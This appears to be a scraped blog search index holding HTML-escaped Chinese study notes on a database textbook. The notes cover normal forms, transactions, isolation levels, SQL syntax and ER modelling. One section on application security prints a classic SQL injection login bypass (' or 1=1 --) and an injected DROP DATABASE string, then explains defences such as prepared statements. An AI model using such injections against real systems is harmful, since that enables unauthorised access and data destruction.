&lt;strong&gt;函数依赖&lt;/strong&gt; ： 在关系模式r（R）上，&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%871_1d9f00cfb0758e57cb9ab1daff04b6a9.png&#34; alt=&#34;图片1.png&#34; loading=&#34;lazy&#34;&gt;，&lt;br&gt;
1 r（R）的实例对t1与t2，若t1[a]=t2[a]，则t1[b]=t2[b]，那么满足函数依赖&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%871_dc5e1da00cc02926a9934f3470bcc99e.png&#34; alt=&#34;图片1.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
2 对于r（R）的每个合法实例都满足函数依赖&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%871_dc5e1da00cc02926a9934f3470bcc99e.png&#34; alt=&#34;图片1.png&#34; loading=&#34;lazy&#34;&gt;，那么该函数依赖在模式r（R）上成立。&lt;br&gt;
若K-&amp;gt;R在关系模式r（R）上成立，那么K是一个超码。&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_e3c4d77f2396b3da30f690881bc6796e.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
在上图中，A-&amp;gt;C满足函数依赖，而C-&amp;gt;A不满足。&lt;br&gt;
在所有关系中都满足的函数依赖是平凡的函数依赖。（例如A-&amp;gt;A）&lt;br&gt;
F+称为函数依赖F集合的闭包，即F集合可以推导出的所有函数依赖的集合。&lt;/p&gt;
&lt;h3 id=&#34;bcnf&#34;&gt;BCNF&lt;/h3&gt;
&lt;p&gt;对于F+中所有的函数依赖a-&amp;gt;b,至少满足下面一项：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;a-&amp;gt;b是平凡的函数依赖。&lt;/li&gt;
&lt;li&gt;a是模式R的一个超码。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;则满足BCNF&lt;/p&gt;
&lt;h4 id=&#34;分解不属于bcnf的模式&#34;&gt;分解不属于BCNF的模式&lt;/h4&gt;
&lt;p&gt;在关系模式r（R）中存在至少一个非平凡的函数依赖a-&amp;gt;b，且a不是R的超码，则用以下两个模式取代R：&lt;br&gt;
1 &lt;img src=&#34;http://static.yulan.net.cn/image/image_6dc7315535b996db34fd6bd1ad1ad351.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
2 &lt;img src=&#34;http://static.yulan.net.cn/image/image_3781bb947709648dabd4a52eec7cf656.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;3nf第三范式&#34;&gt;3NF，第三范式&lt;/h2&gt;
&lt;p&gt;一种比BCNF弱的范式，在BCNF的基础上允许保持函数依赖。&lt;br&gt;
&lt;strong&gt;3NF消除了传递函数依赖。BCNF在3NF的基础上消除了主属性对于码的部分函数依赖。&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;典型案例多对多对一学号-qq号-姓名假设一个学生只能有一个qq号&#34;&gt;典型案例：多对多对一：学号、qq号、姓名（假设一个学生只能有一个qq号）&lt;/h4&gt;
&lt;p&gt;在BCNF的基础上，允许&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;a-&amp;gt;b是平凡的函数依赖 。   （BCNF）&lt;/li&gt;
&lt;li&gt;a是模式R的一个超码。        （BCNF）&lt;/li&gt;
&lt;li&gt;b - a 中的每个属性A都包含于R的一个候选码中。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;函数依赖理论&#34;&gt;函数依赖理论&lt;/h2&gt;
&lt;h3 id=&#34;函数依赖集的闭包&#34;&gt;函数依赖集的闭包&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;逻辑蕴含&lt;/strong&gt; ：若每一个满足函数依赖F的实例也满足f，则F逻辑蕴含f。&lt;br&gt;
F+称为函数依赖F集合的闭包，即F集合可以推导出的所有函数依赖的集合。&lt;br&gt;
&lt;strong&gt;Armstrong公理&lt;/strong&gt; &lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_8eb5fa4942ec5b3de0d4fbe9ead8ccfc.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;属性集的闭包&#34;&gt;属性集的闭包&lt;/h3&gt;
&lt;p&gt;设a为一个属性集，则在函数依赖F下被a函数确定的属性的集合，称为a的闭包，记作a+。&lt;/p&gt;
&lt;h3 id=&#34;正则覆盖&#34;&gt;正则覆盖&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;无关属性&lt;/strong&gt; &lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_e48ae77b7f5d496cf68a5dc4ed4797ef.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;strong&gt;正则覆盖&lt;/strong&gt; &lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_c261dc58f5be1d8659624a92a2686ae8.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;无损分解&#34;&gt;无损分解&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;http://static.yulan.net.cn/image/image_49ae2f623f318ee5cf3d228f9b7d7945.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_6ccb6e08840e6bdf4bb5652cfb08fecb.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;保持依赖&#34;&gt;保持依赖&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;http://static.yulan.net.cn/image/image_a4b51c7274dea744638d19dbfe235fcd.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
算法没看懂。&lt;br&gt;
BCNF范式可能出现无法保持依赖的情况，3NF允许了保持依赖。&lt;/p&gt;
&lt;h2 id=&#34;4nf&#34;&gt;4NF&lt;/h2&gt;
&lt;h3 id=&#34;多值依赖&#34;&gt;多值依赖&lt;/h3&gt;
">《数据库系统概念》--第八章</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_qiosri/"" data-c="
          &lt;h2 id=&#34;acid&#34;&gt;ACID&lt;/h2&gt;
&lt;p&gt;事务具有4个特征，分别是原子性、一致性、隔离性和持久性，简称事务的ACID特性；&lt;/p&gt;
&lt;h3 id=&#34;一-原子性atomicity&#34;&gt;一、原子性（atomicity)&lt;/h3&gt;
&lt;p&gt;一个事务要么全部提交成功，要么全部失败回滚，不能只执行其中的一部分操作，这就是事务的原子性。&lt;/p&gt;
&lt;h3 id=&#34;二-一致性consistency&#34;&gt;二、一致性（consistency)&lt;/h3&gt;
&lt;p&gt;事务的执行不能破坏数据库数据的完整性和一致性，一个事务在执行之前和执行之后，数据库都必须处于一致性状态。&lt;br&gt;
例如在一次转账事务中，余额的总和不能改变，这就是一致性。&lt;/p&gt;
&lt;h3 id=&#34;三-隔离性isolation&#34;&gt;三、隔离性（isolation）&lt;/h3&gt;
&lt;p&gt;事务的隔离性是指在并发环境中，并发的事务时相互隔离的，一个事务的执行不能不被其他事务干扰。不同的事务并发操作相同的数据时，每个事务都有各自完成的数据空间，即一个事务内部的操作及使用的数据对其他并发事务时隔离的，并发执行的各个事务之间不能相互干扰。&lt;/p&gt;
&lt;p&gt;在标准SQL规范中，定义了4个事务隔离级别，不同的隔离级别对事务的处理不同，分别是：未授权读取，授权读取，可重复读取和串行化&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;读未提交（Read Uncommited）。该隔离级别允许脏读取，其隔离级别最低；比如事务A和事务B同时进行，事务A在整个执行阶段，会将某数据的值从1开始一直加到10，然后进行事务提交，此时，事务B能够看到这个数据项在事务A操作过程中的所有中间值（如1变成2，2变成3等），而对这一系列的中间值的读取就是未授权读取。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;授权读取也称为已提交读（Read Commited）。授权读取只允许获取已经提交的数据。比如事务A和事务B同时进行，事务A进行+1操作，此时，事务B无法看到这个数据项在事务A操作过程中的所有中间值，只能看到最终的10。另外，如果说有一个事务C，和事务A进行非常类似的操作，只是事务C是将数据项从10加到20，此时事务B也同样可以读取到20，即授权读取允许不可重复读取。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可重复读（Repeatable Read)。就是保证在事务处理过程中，多次读取同一个数据时，其值都和事务开始时刻是一致的，因此该事务级别禁止不可重复读取和脏读取，但是有可能出现幻影数据。所谓幻影数据，就是指同样的事务操作，在前后两个时间段内执行对同一个数据项的读取，可能出现不一致的结果。在上面的例子中，可重复读取隔离级别能够保证事务B在第一次事务操作过程中，始终对数据项读取到1，但是在下一次事务操作中，即使事务B（注意，事务名字虽然相同，但是指的是另一个事务操作）采用同样的查询方式，就可能读取到10或20。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;串行化（Serialization）。是最严格的事务隔离级别，它要求所有事务被串行执行，即事务只能一个接一个的进行处理，不能并发执行。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;四-持久性durability&#34;&gt;四、持久性（durability）&lt;/h3&gt;
&lt;p&gt;一旦事务提交，那么它对数据库中的对应数据的状态的变更就会永久保存到数据库中。--即使发生系统崩溃或机器宕机等故障，只要数据库能够重新启动，那么一定能够将其恢复到事务成功结束的状态&lt;/p&gt;
&lt;h2 id=&#34;锁&#34;&gt;锁&lt;/h2&gt;
&lt;h3 id=&#34;共享锁与排它锁&#34;&gt;共享锁与排它锁&lt;/h3&gt;
&lt;p&gt;与读写锁类似。&lt;br&gt;
相容矩阵：&lt;img src=&#34;http://static.yulan.net.cn/image/image_f64b5850e204c3d0b8f707b4b7f94c06.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;意向锁&#34;&gt;意向锁&lt;/h3&gt;
&lt;p&gt;为了形成多粒度的封锁。&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_ac37a2c9bbc1a9bcf8da36f066376bd9.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
在一个高层级上加意向锁，则意味着要在其底层级上显示地加锁。&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_fb641073223f60a81403c17f446a2ba0.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_2b1fd513fa8f9f05b1096bdb01a1344d.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_07338f4f450c0339a2bd111ebb420702.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;脏读-不可重复读与幻读&#34;&gt;脏读、不可重复读与幻读&lt;/h2&gt;
&lt;p&gt;理论性参考：&lt;a href=&#34;https://zhuanlan.zhihu.com/p/117476959&#34;&gt;https://zhuanlan.zhihu.com/p/117476959&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;以下测试的原始数据与隔离级别&lt;/p&gt;
&lt;h3 id=&#34;脏读&#34;&gt;脏读&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;http://static.yulan.net.cn/image/image_e2f93d5ac1b57110a249f7e8cede5550.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_dc700df72f3af04802ebfea490b1b033.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
经过上面的实验可以得出结论，事务B更新了一条记录，但是没有提交，此时事务A可以查询出未提交记录。造成脏读现象。未提交读是最低的隔离级别。&lt;/p&gt;
&lt;h3 id=&#34;不可重复读&#34;&gt;不可重复读&lt;/h3&gt;
&lt;p&gt;初始状态与隔离级别。&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_e3b3f97d3522e5c66b34ebe2394feaf6.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_598a24a354731566fc49838516b899c1.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
经过上面的实验可以得出结论，已提交读隔离级别解决了脏读的问题，但是出现了不可重复读的问题，即事务A在两次查询的数据不一致，因为在两次查询之间事务B更新了一条数据。已提交读只允许读取已提交的记录，但不要求可重复读。&lt;/p&gt;
&lt;h3 id=&#34;幻读&#34;&gt;幻读&lt;/h3&gt;
&lt;p&gt;初始数据&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_e0e1e3eb4fa72439f2a59640a40f9236.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_e39d7611d61a4bcfbf46d278c3d211bf.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
可见在repeatable read隔离级别下，不会出现不可重复读的问题。&lt;br&gt;
幻读问题：&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_4722385d3d5d80e16b6d69df2df1667d.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">《数据库系统概念》--第十二章</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_gqb5hm/"" data-c="
          &lt;p&gt;查询优化的一般性准则：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;尽早执行选择操作(where)&lt;/li&gt;
&lt;li&gt;尽早执行投影操作(select)&lt;/li&gt;
&lt;li&gt;尽量避免笛卡尔积&lt;/li&gt;
&lt;/ul&gt;
">《数据库系统概念》--第十一章</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_wg83mx/"" data-c="
          &lt;p&gt;b+树的一些参考&lt;br&gt;
&lt;a href=&#34;https://www.cnblogs.com/nanlinghan/p/10315653.html&#34;&gt;b+树概念&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://www.jianshu.com/p/2dd90b541694&#34;&gt;b+树概念与争议&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://blog.csdn.net/u011711997/article/details/80420392&#34;&gt;b+树实现&lt;/a&gt;&lt;/p&gt;
">《数据库系统概念》--第十章</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_optq0o/"" data-c="
          &lt;h2 id=&#34;应用安全问题&#34;&gt;应用安全问题&lt;/h2&gt;
&lt;h3 id=&#34;sql注入&#34;&gt;SQL注入&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;String sql = &amp;quot;select * from user_table where username=
&#39; &amp;quot;+userName+&amp;quot; &#39; and password=&#39; &amp;quot;+password+&amp;quot; &#39;&amp;quot;;

--当输入了上面的用户名和密码，上面的SQL语句变成：
SELECT * FROM user_table WHERE username=
&#39;’or 1 = 1 -- and password=&#39;’

&amp;quot;&amp;quot;&amp;quot;
--分析SQL语句：
--条件后面username=”or 1=1 用户名等于 ” 或1=1 那么这个条件一定会成功；

--然后后面加两个-，这意味着注释，它将后面的语句注释，让他们不起作用，这样语句永远都--能正确执行，用户轻易骗过系统，获取合法身份。
--这还是比较温柔的，如果是执行
SELECT * FROM user_table WHERE
username=&#39;&#39; ;DROP DATABASE (DB Name) --&#39; and password=&#39;&#39;
--其后果可想而知…
&amp;quot;&amp;quot;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;如何防御SQL注入&lt;/strong&gt;&lt;br&gt;
　　注意：但凡有SQL注入漏洞的程序，都是因为程序要接受来自客户端用户输入的变量或URL传递的参数，并且这个变量或参数是组成SQL语句的一部分，对于用户输入的内容或传递的参数，我们应该要时刻保持警惕，这是安全领域里的「外部数据不可信任」的原则，纵观Web安全领域的各种攻击方式，大多数都是因为开发者违反了这个原则而导致的，所以自然能想到的，就是从变量的检测、过滤、验证下手，确保变量是开发者所预想的。&lt;br&gt;
　　&lt;strong&gt;1、检查变量数据类型和格式&lt;/strong&gt;&lt;br&gt;
　　如果你的SQL语句是类似where id={$id}这种形式，数据库里所有的id都是数字，那么就应该在SQL被执行前，检查确保变量id是int类型；如果是接受邮箱，那就应该检查并严格确保变量一定是邮箱的格式，其他的类型比如日期、时间等也是一个道理。总结起来：只要是有固定格式的变量，在SQL语句执行前，应该严格按照固定格式去检查，确保变量是我们预想的格式，这样很大程度上可以避免SQL注入攻击。&lt;br&gt;
　　比如，我们前面接受username参数例子中，我们的产品设计应该是在用户注册的一开始，就有一个用户名的规则，比如5-20个字符，只能由大小写字母、数字以及一些安全的符号组成，不包含特殊字符。此时我们应该有一个check_username的函数来进行统一的检查。不过，仍然有很多例外情况并不能应用到这一准则，比如文章发布系统，评论系统等必须要允许用户提交任意字符串的场景，这就需要采用过滤等其他方案了。&lt;br&gt;
　　&lt;strong&gt;2、过滤特殊符号&lt;/strong&gt;&lt;br&gt;
　　对于无法确定固定格式的变量，一定要进行特殊符号过滤或转义处理。&lt;br&gt;
　　&lt;strong&gt;3、绑定变量，使用预编译语句&lt;/strong&gt;　　&lt;br&gt;
　　MySQL的mysqli驱动提供了预编译语句的支持，不同的程序语言，都分别有使用预编译语句的方法&lt;br&gt;
　　实际上，绑定变量使用预编译语句是预防SQL注入的最佳方式，使用预编译的SQL语句语义不会发生改变，在SQL语句中，变量用问号?表示，黑客即使本事再大，也无法改变SQL语句的结构&lt;/p&gt;
&lt;h3 id=&#34;跨站点脚本xss与请求伪造&#34;&gt;跨站点脚本（xss）与请求伪造&lt;/h3&gt;
&lt;h3 id=&#34;密码泄漏&#34;&gt;密码泄漏&lt;/h3&gt;
&lt;p&gt;。。。&lt;/p&gt;
">《数据库系统概念》--第九章</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_ywb1yv/"" data-c="
          &lt;h2 id=&#34;连接&#34;&gt;连接&lt;/h2&gt;
&lt;p&gt;语法: table1 (natural) (left)(right) join table2 (on ..)&lt;br&gt;
左连接保证左边全部一定出现（实际上是在做笛卡尔积的时候给右边加上一行全为null的行）&lt;br&gt;
右连接同理&lt;br&gt;
Mysql不支持全外连接，要用UNION&lt;/p&gt;
&lt;h3 id=&#34;连接的交换律与结合律&#34;&gt;连接的交换律与结合律&lt;/h3&gt;
&lt;p&gt;不考虑属性的顺序，连接是可交换的。&lt;br&gt;
对于结合律，内连接与全外连接满足，左外连接与又外连接不满足。&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/1_8d998de53edd5194fe9d588bac65048e.jpeg&#34; alt=&#34;1.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;视图view&#34;&gt;视图（view）&lt;/h2&gt;
&lt;p&gt;语法&lt;br&gt;
&lt;strong&gt;create view&lt;/strong&gt; v **as **&lt;query expression&gt;&lt;br&gt;
可以把任意查询语句创造为视图&lt;br&gt;
视图有独立的权限级别&lt;br&gt;
视图主要用来查询，用于修改会带来问题。&lt;br&gt;
&lt;strong&gt;视图维护&lt;/strong&gt;有多种方法，sql标准没有指定如何实现。&lt;br&gt;
视图很适合多表连接。&lt;/p&gt;
&lt;h2 id=&#34;物化视图&#34;&gt;物化视图&lt;/h2&gt;
&lt;p&gt;视图实际上存储的只是查询语句，每次通过视图查询时会执行查询语句。&lt;br&gt;
物化视图就是把查询结果缓存起来。&lt;br&gt;
Mysql没有物化视图，目前只发现Oracle支持。&lt;br&gt;
1.物化视图刷新的方式:&lt;br&gt;
fast: 增量刷新.假设前一次刷新的时间为t1,那么使用fast模式刷新物化视图时,只向视图中添加t1到当前时间段内,主表变化过的数据.为了记录这种变化，建立增量刷新物化视图还需要一个物化视图日志表。&lt;br&gt;
complete:全部刷新。相当于重新执行一次创建视图的查询语句。&lt;br&gt;
force: 这是默认的数据刷新方式。当可以使用fast模式时，数据刷新将采用fast方式；否则使用complete方式。&lt;/p&gt;
&lt;p&gt;2.MV数据刷新的时间：&lt;br&gt;
on demand:在用户需要刷新的时候刷新，这里就要求用户自己动手去刷新数据了（也可以使用job定时刷新）&lt;br&gt;
on commit:当主表中有数据提交的时候，立即刷新MV中的数据；&lt;br&gt;
start ……：从指定的时间开始，每隔一段时间（由next指定）就刷新一次；&lt;/p&gt;
&lt;h2 id=&#34;完整性约束&#34;&gt;完整性约束&lt;/h2&gt;
&lt;h3 id=&#34;primary-key&#34;&gt;primary key&lt;/h3&gt;
&lt;h3 id=&#34;not-null&#34;&gt;not null&lt;/h3&gt;
&lt;h3 id=&#34;unique&#34;&gt;unique&lt;/h3&gt;
&lt;h3 id=&#34;check&#34;&gt;check&lt;/h3&gt;
&lt;p&gt;chenck 可以是任意谓词&lt;br&gt;
如 &lt;code&gt;check(semester in (&#39;Fall&#39;,&#39;Winter&#39;,&#39;Spring&#39;,Summer))&lt;/code&gt; &lt;br&gt;
&lt;code&gt;check(budge&amp;gt;0)&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;参照完整性外键&#34;&gt;参照完整性（外键）&lt;/h3&gt;
&lt;p&gt;sql会拒绝破坏参照完整性的插入。&lt;br&gt;
对于更新（被参照表）导致的破坏，默认是拒绝，但是可以设置&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;CREATE TABLE course1 (
course_id VARCHAR ( 20 ),
dept_name VARCHAR ( 20 ),
PRIMARY KEY ( course_id ),
FOREIGN KEY ( dept_name ) REFERENCES department ( dept_name ) 
  ON DELETE CASCADE 
  ON UPDATE CASCADE 
);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;on delete cascade&lt;/code&gt; 表示级联更新，还可以设置 &lt;code&gt;set null&lt;/code&gt; 与 &lt;code&gt;sel default&lt;/code&gt; 等操作。&lt;/p&gt;
&lt;h3 id=&#34;断言&#34;&gt;断言&lt;/h3&gt;
&lt;p&gt;支持复杂的约束，很少有数据库实现，Mysql不支持。&lt;/p&gt;
&lt;h2 id=&#34;权限&#34;&gt;权限&lt;/h2&gt;
&lt;p&gt;sql允许授权给用户或角色，可以对视图进行授权，可以支持权限转移，以及级联收回。&lt;br&gt;
基本语法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;grant &amp;lt;权限列表&amp;gt;
on &amp;lt;关系名或视图名&amp;gt;
to &amp;lt;用户/角色列表&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;收回权限&lt;br&gt;
revoke on from&lt;/p&gt;
">《数据库系统概念》--第四章</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_uk37gv/"" data-c="
          &lt;h2 id=&#34;实体集&#34;&gt;实体集&lt;/h2&gt;
&lt;h3 id=&#34;实体&#34;&gt;实体&lt;/h3&gt;
&lt;p&gt;实体指现实世界中可以区别与其他事务或对象的一个事务或对象。（人、书、课程...）&lt;/p&gt;
&lt;h3 id=&#34;实体集-2&#34;&gt;实体集&lt;/h3&gt;
&lt;p&gt;具有相同性质的一组实体的集合。&lt;br&gt;
实体集不必互不相交。&lt;/p&gt;
&lt;h2 id=&#34;联系集&#34;&gt;联系集&lt;/h2&gt;
&lt;h2 id=&#34;联系&#34;&gt;联系&lt;/h2&gt;
&lt;p&gt;联系指多个实体之间的相互关联。&lt;/p&gt;
&lt;h2 id=&#34;属性&#34;&gt;属性&lt;/h2&gt;
&lt;p&gt;实体具有属性，联系也可以具有属性（学生与老师选课关系中的date就是关系的属性）。&lt;/p&gt;
&lt;h3 id=&#34;简单属性与复杂属性&#34;&gt;简单属性与复杂属性&lt;/h3&gt;
&lt;p&gt;简单属性不可再分，复杂属性可以继续划分（名字分为姓和名）。&lt;/p&gt;
&lt;h3 id=&#34;单值属性和多值属性&#34;&gt;单值属性和多值属性&lt;/h3&gt;
&lt;p&gt;每个人有电话，可以有0个或多个，就是多值属性。&lt;/p&gt;
&lt;h3 id=&#34;派生属性&#34;&gt;派生属性&lt;/h3&gt;
&lt;p&gt;属性age可以通过属性birthday得出，age就是派生属性。&lt;/p&gt;
&lt;h2 id=&#34;约束&#34;&gt;约束&lt;/h2&gt;
&lt;h3 id=&#34;映射基数&#34;&gt;映射基数&lt;/h3&gt;
&lt;p&gt;一对一、一对多、多对一、多对多。&lt;/p&gt;
&lt;h3 id=&#34;参与约束&#34;&gt;参与约束&lt;/h3&gt;
&lt;p&gt;实体集E中的每个实体都参与到联系集R中的至少一个联系里面，那么就是 &lt;strong&gt;全部参与&lt;/strong&gt; ，否则是 &lt;strong&gt;部分参与  。&lt;/strong&gt;&lt;br&gt;
（每个学生都要选课，不是所有老师都要授课，学生就是全部参与，老师是部分参与）&lt;/p&gt;
&lt;h3 id=&#34;键约束&#34;&gt;键约束&lt;/h3&gt;
&lt;h3 id=&#34;弱实体集&#34;&gt;弱实体集&lt;/h3&gt;
&lt;p&gt;主键冗余，没有足够的属性形成主键。&lt;br&gt;
若实体集必须与另一个标识实体集关联才有意义，弱实体集的存在依赖于标识实体集。&lt;/p&gt;
&lt;h2 id=&#34;删除冗余约束&#34;&gt;删除冗余约束&lt;/h2&gt;
&lt;p&gt;、、、&lt;/p&gt;
&lt;h2 id=&#34;er图&#34;&gt;ER图&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;矩形代表实体集（分成名字和属性）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;菱形代表关系&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;线段将实体集联系到联系集&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;虚线连接联系集和其属性&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;双线代表实体集全部参与&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;双菱型代表弱实体连接标志性联系集&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;带箭头的线代表一参与，不带箭头代表多参与&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;**&lt;/p&gt;
&lt;h2 id=&#34;er图转化为关系模式&#34;&gt;ER图转化为关系模式&lt;/h2&gt;
&lt;h3 id=&#34;简单属性的强实体集&#34;&gt;简单属性的强实体集&lt;/h3&gt;
&lt;p&gt;直接转换为对应的关系模式。（主键不变）&lt;/p&gt;
&lt;h3 id=&#34;复杂属性的强实体集&#34;&gt;复杂属性的强实体集&lt;/h3&gt;
&lt;p&gt;将复合属性替换为其子属性，对于多值属性，需要创建新的关系模式（属性为实体的主键和多值属性，并且共同构成主键，且实体的主键生成的属性要外键参照源实体的模式）。&lt;/p&gt;
&lt;h3 id=&#34;弱实体集-2&#34;&gt;弱实体集&lt;/h3&gt;
&lt;p&gt;生成模式的主键为该弱实体所依赖的强实体的主键与该弱实体的分辨符组合而成，同时要创造外键约束与级联删除。&lt;/p&gt;
&lt;h3 id=&#34;联系集转换为关系模式&#34;&gt;联系集转换为关系模式&lt;/h3&gt;
&lt;h3 id=&#34;二元联系&#34;&gt;二元联系&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;多对多：参与的两个实体集的主键共同构成联系的主键&lt;/li&gt;
&lt;li&gt;一对一：任意一个实体集的主键均可构成联系集的关系模式的主键&lt;/li&gt;
&lt;li&gt;多对一：“多”的那一方的主键构成联系集的关系模式的主键&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;模式冗余与合并&#34;&gt;模式冗余与合并&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;联系弱实体集与其所依赖的强实体集的模式是冗余的，在关系模式中一般不必给出&lt;/li&gt;
&lt;li&gt;实体集A到B是一个多对一的联系集AB，且A在该联系中是全部参与，可以把A和AB模式合并成单个包含两个模式所有属性的并集的模式，其主键是A的主键，AB中的外键约束要带到合并的模式中&lt;/li&gt;
&lt;li&gt;对于一对一的情况，联系集的关系模式可以与任意一个实体集的关系模式合并&lt;/li&gt;
&lt;/ul&gt;
">《数据库系统概念》--第七章</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_gwsquv/"" data-c="
          &lt;h2 id=&#34;函数&#34;&gt;函数&lt;/h2&gt;
&lt;p&gt;Mysql创建函数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;CREATE FUNCTION dept_count (dept_name VARCHAR ( 20 )) 
RETURNS INT ( 11 ) 
BEGIN
	DECLARE
		d_count INT;
	SELECT
		COUNT(*) INTO d_count 
	FROM
		instructor 
	WHERE
		instructor.dept_name = dept_name;
	RETURN d_count;
END
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;SELECT
	dept_name,
	budget ,
	dept_count(dept_name)
FROM
	department 
WHERE
	dept_count ( dept_name ) &amp;gt; 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;sql支持函数与过程重载&lt;/p&gt;
